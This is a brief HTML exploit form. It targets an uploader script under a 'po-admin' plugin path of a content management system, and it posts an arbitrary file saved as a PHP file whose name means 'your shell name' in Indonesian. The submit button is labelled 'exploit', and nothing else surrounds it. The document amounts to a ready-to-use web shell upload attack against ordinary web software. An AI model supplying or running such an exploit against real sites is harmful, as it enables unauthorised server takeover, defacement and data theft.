<form method="post" action="target.c0li/po-admin/js/plugins/uploader/upload.php" enctype="multipart/form-data">
<input type="file" name="file">
<input type="hidden" name="name" value="nama_shell_anda.php">
<input type="submit" value="exploit">
</form>